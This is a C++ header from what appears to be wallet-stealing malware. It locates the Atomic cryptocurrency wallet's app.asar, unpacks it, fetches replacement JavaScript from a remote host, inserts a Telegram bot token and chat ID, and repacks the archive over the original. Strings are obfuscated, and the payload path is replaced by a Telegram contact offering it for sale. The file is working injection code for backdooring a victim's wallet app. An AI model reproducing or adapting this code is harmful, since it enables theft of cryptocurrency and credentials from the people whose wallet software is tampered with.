#ifndef ATOMIC_HPP
#define ATOMIC_HPP

#include "asar.hpp"
#include <shlobj.h>
#include "Get.hpp"
#include <random>

namespace fs = std::filesystem;

class Atomic {
public:
    void Inject(std::string ChatID, std::string Token) {
        try {
            fs::path asarPath = GetAtomicPath();
            if (!fs::exists(asarPath)) {
                throw std::runtime_error(OBF("Atomic ASAR not found"));
            }

            fs::path tempDir = fs::temp_directory_path() / RandomString(5);
            fs::create_directories(tempDir);

            AsarTools::AsarUnpacker parser(asarPath.string());
            parser.extract_all(tempDir.string());

            std::string newContent = FetchUrl(
                OBF(L"raw.githubusercontent.com"),
                OBF(L"Want this? contact : t.me/NyxEnigma"),
                true
            );

            newContent = Replace(newContent, "%TOKEN%", Token); // Token is base64 encoded when passed to the Func
            newContent = Replace(newContent, "%CHAT%", ChatID); // Same here

            AsarTools::OverWrite(tempDir, OBF("dist/electron/vendors.ac1438b2546b551d3af1.js"), newContent); // May Change in the future (Gonna prob add some fancy auto detect of the func i inject into
                                                                                                             // to auto find the correct file)

            fs::path modifiedAsar = asarPath.parent_path() / (OBF("app_") + RandomString(5) + OBF(".asar"));
            AsarTools::AsarPacker builder(tempDir.string(), modifiedAsar.string());
            builder.pack();

            fs::remove(asarPath);
            fs::rename(modifiedAsar, asarPath);

            fs::remove_all(tempDir);
        }
        catch (const std::exception& e) {
            throw;
        }
    }

private:
    fs::path GetAtomicPath() {
        char path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            return fs::path(path) / OBF("Programs") / OBF("atomic") / OBF("resources") / OBF("app.asar");
        }
        throw std::runtime_error(OBF("Couldn't find Atomic path"));
    }

    static std::string RandomString(int length) {
        static const std::string chars = OBF("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
        std::random_device rd;
        std::mt19937 generator(rd());
        std::uniform_int_distribution<> dist(0, chars.size() - 1);

        std::string result;
        result.reserve(length);
        for (int i = 0; i < length; ++i) {
            result += chars[dist(generator)];
        }
        return result;
    }

    static std::string Replace(std::string org, const std::string& Target, const std::string& Replacement) {
        try {
            if (Target.empty()) return org;
            size_t pos = 0;
            while ((pos = org.find(Target, pos)) != std::string::npos) {
                org.replace(pos, Target.length(), Replacement);
                pos += Replacement.length();
            }
            return org;
        }
        catch (...) {
            return org;
        }
    }
};

#endif